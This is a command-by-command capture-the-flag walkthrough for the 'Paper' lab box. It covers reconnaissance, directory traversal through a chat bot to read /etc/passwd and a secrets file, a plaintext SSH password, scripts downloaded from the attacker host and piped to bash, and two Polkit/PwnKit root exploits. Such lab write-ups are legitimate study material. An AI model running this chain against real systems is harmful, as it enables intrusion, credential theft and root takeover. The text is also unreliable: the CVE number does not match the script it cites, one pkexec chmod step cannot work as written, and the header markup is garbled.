## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

### Recon
```bash
nmap -p- --min-rate 10000 10.10.11.143
nmap -p 22,80,443 -sCV 10.10.11.143
```

### Directory/Subdomain Discovery
```bash
feroxbuster -u http://office.paper
wfuzz -u http://office.paper -H "Host: FUZZ.office.paper" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 199691
```

### [WordPress Enumeration](HTTP)
```bash
wpscan --url http://office.paper --api-token $WPSCAN_API
```

### CVE-2019-17671 - View Draft Posts
```bash
# Visit in browser:
http://office.paper/?static=1
```

### Rocket.Chat - Directory Traversal via recyclops Bot
```
# In DM to @recyclops
list ../../../
file ../../../etc/passwd
file ../../../hubot/.env
```

### Credential Discovery & SSH Access
```bash
# Found creds in .env:
# dwight:Queenofblad3s!23

crackmapexec ssh 10.10.11.143 -u dwight -p 'Queenofblad3s!23'

sshpass -p 'Queenofblad3s!23' ssh dwight@10.10.11.143
```

### LinPEAS Enumeration
```bash
git clone https://github.com/carlospolop/PEASS-ng
cd PEASS-ng/linPEAS
python3 -m builder.linpeas_builder
python3 -m http.server 80

# On target:
wget http://10.10.14.6/linpeas.sh
bash linpeas.sh
```

### CVE-2021-3650 (Polkit User Creation)
```bash
# Host side:
wget https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/cve-2021-3650.sh
python3 -m http.server 80

# On Paper:
wget http://10.10.14.6/cve-2021-3650.sh
bash cve-2021-3650.sh

# Login to new user
su - secnigma
# Password: secnigmaftw
sudo bash
```

### PwnKit - (CVE-2021-4034)
```bash
# On Paper:
ls -l /usr/bin/pkexec
# If not setuid:
chmod 4755 /usr/bin/pkexec

# Compile exploit:
cc -Wall exploit.c -o exploit

# Run exploit:
./exploit
```

### Flags
```bash
cat /home/dwight/user.txt
cat /root/root.txt
```